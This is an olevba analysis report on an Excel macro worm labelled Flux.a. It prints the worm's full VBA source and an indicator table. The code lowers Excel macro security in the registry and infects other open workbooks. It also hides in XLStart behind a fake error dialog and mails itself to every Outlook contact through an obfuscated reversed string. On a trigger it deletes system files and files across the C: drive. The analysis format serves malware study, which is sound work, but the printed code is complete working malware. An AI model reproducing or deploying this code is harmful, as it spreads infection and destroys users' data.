olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSExcel.Flux.a-b9d0ea6ef2a4ea6532c914894d4227368033fd5b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Email-Worm.MSExcel.Flux.a-b9d0ea6ef2a4ea6532c914894d4227368033fd5b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Do Not Remove Lines.

'***********************************************************
'
' *        *   *********   *********   *********   *
'  *      *    *           *               *   *
'   *    *     *********   *********   *********   *
'    *  *              *   *       *   *           *
'     **       *********   *********   *********   *
'
'***********************************************************

'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Dim FLUX_INSTALL, FLUX_ACTIVATE, FLUX_COUNT_CHARACTERS, FLUX_DIR_WIN, FLUX_PATHMIRC, FLUX_COUNTOFLINES_INFECT1, FLUX_COUNTOFLINES_INFECT2, FLUX_READLINES_INFECT1, FLUX_READLINES_INFECT2, FLUX_BYTE1, FLUX_BYTE2

Private Sub Workbook_Activate()
On Error Resume Next
FLUX_DIR_WIN = Environ("WINDIR")
FLUX_INSTALL = Application.Path & "\XLStart"
If Dir(FLUX_INSTALL & "\EUROTOOL1.XLS") = "" Then
MsgBox "Error 255 Library Excel.dll", vbCritical, "Error"
Windows.Item(1).Visible = False
End If
End Sub

Private Sub Workbook_BeforeClose(Cancel As Boolean)
On Error Resume Next
Dim SendMail As New MSScriptControl.ScriptControl
Set FLUX_REGEDIT = CreateObject("WScript.Shell")
FLUX_BYTE1 = 0
FLUX_BYTE2 = 0
For FLUX_BUCLE_REGEDIT = 5 To 10
FLUX_REGEDIT.RegWrite "HKCU\Software\Microsoft\Office\" & FLUX_BUCLE_REGEDIT & ".0\Excel\Security\Level", 1, "REG_DWORD"
Next
FLUX_DIR_WIN = Environ("WINDIR")
FLUX_INSTALL = Application.Path & "\XLStart"
Set FLUX_INFECT1 = ThisWorkbook.Application.Workbooks.Item(1).VBProject.VBComponents.Item(1).CodeModule
Set FLUX_INFECT2 = ThisWorkbook.Application.Workbooks.Item(2).VBProject.VBComponents.Item(1).CodeModule
FLUX_COUNTOFLINES_INFECT1 = FLUX_INFECT1.CountOfLines
FLUX_COUNTOFLINES_INFECT2 = FLUX_INFECT2.CountOfLines
For FLUX_BUCLE_INFECT1 = 1 To FLUX_COUNTOFLINES_INFECT1
If FLUX_INFECT1.Lines(FLUX_BUCLE_INFECT1, 1) = "'Virus FLUX Written By Vsg21" Then
FLUX_BYTE1 = 1
Exit For
End If
Next
For FLUX_BUCLE_INFECT2 = 1 To FLUX_COUNTOFLINES_INFECT2
If FLUX_INFECT2.Lines(FLUX_BUCLE_INFECT2, 1) = "'Virus FLUX Written By Vsg21" Then
FLUX_BYTE2 = 1
Exit For
End If
Next
If FLUX_BYTE1 <> 1 Then
FLUX_READLINES_INFECT2 = FLUX_INFECT2.Lines(1, FLUX_COUNTOFLINES_INFECT2)
FLUX_INFECT1.Deletelines 1, FLUX_COUNTOFLINES_INFECT1
FLUX_INFECT1.InsertLines 1, FLUX_READLINES_INFECT2
Workbooks.Item(1).Save
End
End If
If FLUX_BYTE2 <> 1 Then
FLUX_READLINES_INFECT1 = FLUX_INFECT1.Lines(1, FLUX_COUNTOFLINES_INFECT1)
FLUX_INFECT2.Deletelines 1, FLUX_COUNTOFLINES_INFECT2
FLUX_INFECT2.InsertLines 1, FLUX_READLINES_INFECT1
End If
If Dir(FLUX_INSTALL & "\EUROTOOL1.XLS") = "" Then Workbooks.Item(1).SaveAs FLUX_INSTALL & "\EUROTOOL1.XLS"
Open FLUX_DIR_WIN & "\INF\XLS.INF" For Append As #1
Print #1, "@"
Close #1
FLUX_COUNT_CHARACTERS = FileLen(FLUX_DIR_WIN & "\INF\XLS.INF")
If Day(Now) = 21 And Month(Now) = 11 Then
MsgBox "Happy Birthday Vsg21!!!", vbSystemModal, "FLUX"
FLUX_ACTIVE_VSG21
End If
If FLUX_COUNT_CHARACTERS = 203 Then FLUX_ACTIVE_VSG21
If ThisWorkbook.Name = "EUROTOOL1.XLS" Then
Windows.Item(1).Visible = False
Workbooks.Item(1).Save
End If
If Dir(FLUX_DIR_WIN & "\Readme.XLS") = "" Then
Workbooks.Item(1).SaveAs FLUX_DIR_WIN & "\Readme.XLS"
SendMail.Language = "VBScript"
SendMail.ExecuteStatement StrReverse("gnihtoN=ipammiS teS:gnihtoN=1mapsmiS teS:txen:txen:1+x=x:dneS.mmiS:2 = ecnatropmI.mmiS:""SLX.emdaeR\"" & NIW_RID_XULF ddA.stnemhcattA.mmiS:""XevitcA le atilibah anigap aneub euq ariM"" = ydoB.mmiS:""kniL"" = tcejbuS.mmiS:lmiS ddA.stneipiceR.mmiS:)0(metIetaerC.1mapsmiS = mmiS tes:)x(seirtnEsserddA.damiS = lmiS:tnuoC.seirtnEsserddA.damiS ot 1 = clmiS rof:1 = x:)stsilmiS(stsiLsserddA.ipammiS = damiS tes:tnuoC.stsiLsserddA.ipammiS ot 1 = stsilmiS rof:)""IPAM""(ecapSemaNteG.1mapsmiS = ipammiS tes:)""noitacilppA.kooltuO""(tcejbOetaerC = 1mapsmiS tes:txeN emuseR rorrE nO")
End If

'****************************
'Virus FLUX Written By Vsg21
'****************************

End Sub
Sub FLUX_ACTIVE_VSG21()
On Error Resume Next
Kill FLUX_DIR_WIN & "\INF\XLS.INF"
SetAttr "C:\IO.SYS", vbNormal
Kill "C:\IO.SYS"
Kill FLUX_DIR_WIN & "\SYSTEM\*.VXD"
FLUX_ACTIVATE = Dir("C:\", vbDirectory)
For FLUX_BUCLE_ACTIVATE = 1 To 1000
Kill "C:\" & FLUX_ACTIVATE & "\*.*"
FLUX_ACTIVATE = Dir
If FLUX_ACTIVATE = "" Then Exit For
Next
MsgBox "Virus FLUX Written By Vsg21", vbSystemModal, "FLUX"
For FLUX_BUCLE_STOP_SYSTEM = 1 To 1E+308
SendKeys "^", True
Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: Email-Worm.MSExcel.Flux.a-b9d0ea6ef2a4ea6532c914894d4227368033fd5b - OLE stream: '_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Hoja1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Excel.dll           |Executable file name                         |
|IOC       |XLS.INF             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

